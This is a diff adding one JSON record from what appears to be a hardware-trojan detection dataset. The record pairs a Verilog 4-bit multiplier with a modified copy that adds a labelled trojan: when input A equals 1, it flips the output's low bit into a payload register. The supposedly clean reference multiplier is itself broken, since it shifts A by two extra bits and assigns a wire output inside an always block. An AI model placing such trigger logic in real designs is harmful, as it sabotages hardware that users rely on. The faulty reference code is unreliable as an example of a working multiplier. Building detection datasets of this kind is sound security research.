@@ -1,0 +1,19 @@
+{
+    "sample_id": "SRTL_513",
+    "instruction": "Please act as a professional Verilog designer. Create a module that implements a circuit for a 4-bit multiplier. The module should have two inputs, A and B, and one output, out. The input A and B are 4-bit signals that represent two 4-bit binary numbers. The output out is an 8-bit signal that contains the result of the multiplication. The module contains an always block that is triggered on any change in the inputs. Inside the always block, an iterative loop is used to perform the multiplication operation. The loop should iterate through each bit of the input B and multiply it with the input A. The result of each multiplication should be shifted to the left by the corresponding bit position and added to the previous result. The final result should be stored in the out output.",
+    "original_rtl": "module four_bit_multiplier (\n  input [3:0] A,\n  input [3:0] B,\n  output [7:0] out\n);\n\n  reg [7:0] result;\n  integer i;\n\n  always @ (A or B) begin\n    result = 0;\n    for (i = 0; i < 4; i = i + 1) begin\n      result = result + (B[i] * {A, 2'b0} << i);\n    end\n    out = result;\n  end\n\nendmodule\n",
+    "modified_rtl": "module four_bit_multiplier (\n  input [3:0] A,\n  input [3:0] B,\n  output [7:0] out\n);\n\n  reg [7:0] result;\n  integer i;\n\n  always @ (A or B) begin\n    result = 0;\n    for (i = 0; i < 4; i = i + 1) begin\n      result = result + (B[i] * {A, 2'b0} << i);\n    end\n    out = result;\n  end\n\n\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [7:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (A == 4'h1);\n    htrojan_pay = htrojan_trig ? (out ^ 8'h01) : out;\nend\n// HT_END\nendmodule\n",
+    "source_index": 513,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "A"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "out"
+    ],
+    "obfuscation_applied": false,
+    "obfuscation_type": null
+}
